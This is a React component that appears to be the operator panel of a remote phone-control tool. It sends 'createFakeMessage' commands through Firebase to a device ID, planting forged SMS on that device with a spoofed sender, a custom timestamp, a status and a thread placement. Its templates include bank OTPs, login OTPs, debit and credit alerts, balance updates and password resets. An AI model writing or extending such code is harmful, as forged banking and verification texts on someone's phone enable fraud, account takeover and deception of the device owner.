import { useState } from 'react'
import { Card, CardContent, CardHeader, CardTitle } from '@/component/ui/card'
import { Button } from '@/component/ui/button'
import { Input } from '@/component/ui/input'
import { Label } from '@/component/ui/label'
import { Switch } from '@/component/ui/switch'
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from '@/component/ui/select'
import { useToast } from '@/lib/use-toast'
import { getDeviceCommandsPath } from '@/lib/firebase-helpers'
import { set } from 'firebase/database'

interface FakeMessagePanelProps {
  deviceId: string
}

export function FakeMessagePanel({ deviceId }: FakeMessagePanelProps) {
  const { toast } = useToast()
  const [useTemplate, setUseTemplate] = useState(false)
  const [templateId, setTemplateId] = useState('')
  const [templateVariables, setTemplateVariables] = useState('')
  const [sender, setSender] = useState('')
  const [message, setMessage] = useState('')
  const [timestamp, setTimestamp] = useState<'now' | 'custom'>('now')
  const [customTimestamp, setCustomTimestamp] = useState('')
  const [status, setStatus] = useState<'received' | 'sent' | 'read' | 'unread' | 'delivered' | 'failed'>('received')
  const [threadId, setThreadId] = useState('')
  const [loading, setLoading] = useState(false)

  // Pre-built templates
  const templates = [
    { id: 'otp_bank', name: 'Bank OTP', category: 'OTP' },
    { id: 'otp_app', name: 'App OTP', category: 'OTP' },
    { id: 'otp_login', name: 'Login OTP', category: 'OTP' },
    { id: 'transaction_debit', name: 'Debit Transaction', category: 'Banking' },
    { id: 'transaction_credit', name: 'Credit Transaction', category: 'Banking' },
    { id: 'balance_update', name: 'Balance Update', category: 'Banking' },
    { id: 'transaction_alert', name: 'Transaction Alert', category: 'Banking' },
    { id: 'delivery_notification', name: 'Delivery Notification', category: 'Service' },
    { id: 'appointment_reminder', name: 'Appointment Reminder', category: 'Service' },
    { id: 'payment_success', name: 'Payment Success', category: 'Service' },
    { id: 'payment_failed', name: 'Payment Failed', category: 'Service' },
    { id: 'welcome_message', name: 'Welcome Message', category: 'Notification' },
    { id: 'verification_success', name: 'Verification Success', category: 'Notification' },
    { id: 'password_reset', name: 'Password Reset', category: 'Notification' },
  ]

  const handleCreate = async () => {
    // Validate sender
    if (!sender.trim()) {
      toast({
        title: 'Validation Error',
        description: 'Sender phone number is required',
        variant: 'destructive',
      })
      return
    }
    
    // Validate phone format
    const phoneRegex = /^\+?[1-9]\d{1,14}$/
    if (!phoneRegex.test(sender.trim())) {
      toast({
        title: 'Validation Error',
        description: 'Invalid sender phone number format. Use international format: +1234567890',
        variant: 'destructive',
      })
      return
    }

    // Validate template or message
    if (useTemplate) {
      if (!templateId.trim()) {
        toast({
          title: 'Validation Error',
          description: 'Please select a template',
          variant: 'destructive',
        })
        return
      }
    } else {
      // Validate message
      if (!message.trim()) {
        toast({
          title: 'Validation Error',
          description: 'Message content is required',
          variant: 'destructive',
        })
        return
      }
      
      if (message.length > 160) {
        toast({
          title: 'Validation Error',
          description: 'Message too long (maximum 160 characters)',
          variant: 'destructive',
        })
        return
      }
    }

    // Validate timestamp
    let finalTimestamp = 'now'
    if (timestamp === 'custom') {
      if (!customTimestamp.trim()) {
        toast({
          title: 'Validation Error',
          description: 'Custom timestamp is required',
          variant: 'destructive',
        })
        return
      }
      
      const timestampNum = parseInt(customTimestamp)
      if (isNaN(timestampNum) || timestampNum <= 0) {
        toast({
          title: 'Validation Error',
          description: 'Invalid timestamp. Use milliseconds since epoch (e.g., 1703123456789)',
          variant: 'destructive',
        })
        return
      }
      
      finalTimestamp = customTimestamp
    }

    setLoading(true)
    try {
      let commandValue: string
      let commandName: string
      
      if (useTemplate) {
        // Use template command
        commandName = 'createFakeMessageTemplate'
        commandValue = `${templateId}:${sender}:${templateVariables || 'null'}`
      } else {
        // Use regular fake message command
        commandName = 'createFakeMessage'
        commandValue = `${sender}:${message}:${finalTimestamp}:${status}:${threadId || 'null'}`
      }
      
      const commandRef = getDeviceCommandsPath(deviceId, commandName)
      
      await set(commandRef, commandValue)
      
      toast({
        title: 'Success',
        description: useTemplate ? 'Fake message from template created successfully' : 'Fake message created successfully',
      })
      
      // Reset form
      setSender('')
      setMessage('')
      setThreadId('')
      setCustomTimestamp('')
      setTimestamp('now')
      setTemplateId('')
      setTemplateVariables('')
      setUseTemplate(false)
    } catch (error) {
      toast({
        title: 'Error',
        description: error instanceof Error ? error.message : 'Failed to create fake message',
        variant: 'destructive',
      })
    } finally {
      setLoading(false)
    }
  }

  return (
    <Card>
      <CardHeader>
        <CardTitle>Create Fake Message</CardTitle>
      </CardHeader>
      <CardContent className="space-y-4">
        <div className="flex items-center justify-between">
          <Label>Use Template</Label>
          <Switch checked={useTemplate} onCheckedChange={setUseTemplate} />
        </div>
        
        <div className="space-y-2">
          <Label>Sender Number</Label>
          <Input
            value={sender}
            onChange={(e) => setSender(e.target.value)}
            placeholder="+1234567890"
          />
        </div>
        
        {useTemplate ? (
          <>
            <div className="space-y-2">
              <Label>Template</Label>
              <Select value={templateId} onValueChange={setTemplateId}>
                <SelectTrigger>
                  <SelectValue placeholder="Select template..." />
                </SelectTrigger>
                <SelectContent>
                  <div className="px-2 py-1.5 text-xs font-semibold text-muted-foreground">OTP</div>
                  {templates.filter(t => t.category === 'OTP').map(t => (
                    <SelectItem key={t.id} value={t.id}>{t.name}</SelectItem>
                  ))}
                  <div className="px-2 py-1.5 text-xs font-semibold text-muted-foreground mt-2">Banking</div>
                  {templates.filter(t => t.category === 'Banking').map(t => (
                    <SelectItem key={t.id} value={t.id}>{t.name}</SelectItem>
                  ))}
                  <div className="px-2 py-1.5 text-xs font-semibold text-muted-foreground mt-2">Service</div>
                  {templates.filter(t => t.category === 'Service').map(t => (
                    <SelectItem key={t.id} value={t.id}>{t.name}</SelectItem>
                  ))}
                  <div className="px-2 py-1.5 text-xs font-semibold text-muted-foreground mt-2">Notification</div>
                  {templates.filter(t => t.category === 'Notification').map(t => (
                    <SelectItem key={t.id} value={t.id}>{t.name}</SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
            
            <div className="space-y-2">
              <Label>Template Variables (Optional)</Label>
              <Input
                value={templateVariables}
                onChange={(e) => setTemplateVariables(e.target.value)}
                placeholder="code=123456&amount=1000&account=1234"
              />
              <p className="text-sm text-muted-foreground">
                Format: key1=value1&key2=value2 (e.g., code=123456&amount=1000)
              </p>
            </div>
          </>
        ) : (
          <div className="space-y-2">
            <Label>Message</Label>
            <Input
              value={message}
              onChange={(e) => setMessage(e.target.value)}
              placeholder="Enter message..."
              maxLength={160}
            />
            <p className="text-sm text-muted-foreground">
              {message.length}/160 characters
            </p>
          </div>
        )}
        
        <div className="space-y-2">
          <Label>Timestamp</Label>
          <Select value={timestamp} onValueChange={(v: any) => setTimestamp(v)}>
            <SelectTrigger>
              <SelectValue />
            </SelectTrigger>
            <SelectContent>
              <SelectItem value="now">Current Time</SelectItem>
              <SelectItem value="custom">Custom Timestamp</SelectItem>
            </SelectContent>
          </Select>
          {timestamp === 'custom' && (
            <Input
              type="number"
              value={customTimestamp}
              onChange={(e) => setCustomTimestamp(e.target.value)}
              placeholder="1703123456789 (milliseconds)"
            />
          )}
        </div>
        
        <div className="space-y-2">
          <Label>Status</Label>
          <Select value={status} onValueChange={(v: any) => setStatus(v)}>
            <SelectTrigger>
              <SelectValue />
            </SelectTrigger>
            <SelectContent>
              <SelectItem value="received">Received</SelectItem>
              <SelectItem value="sent">Sent</SelectItem>
              <SelectItem value="read">Read</SelectItem>
              <SelectItem value="unread">Unread</SelectItem>
              <SelectItem value="delivered">Delivered</SelectItem>
              <SelectItem value="failed">Failed</SelectItem>
            </SelectContent>
          </Select>
        </div>
        
        <div className="space-y-2">
          <Label>Thread ID (Optional)</Label>
          <Input
            value={threadId}
            onChange={(e) => setThreadId(e.target.value)}
            placeholder="Leave empty for new thread"
          />
          <p className="text-sm text-muted-foreground">
            Enter existing thread ID to add message to that conversation, or leave empty for new thread
          </p>
        </div>
        
        <Button onClick={handleCreate} disabled={loading} className="w-full">
          {loading ? 'Creating...' : 'Create Fake Message'}
        </Button>
      </CardContent>
    </Card>
  )
}
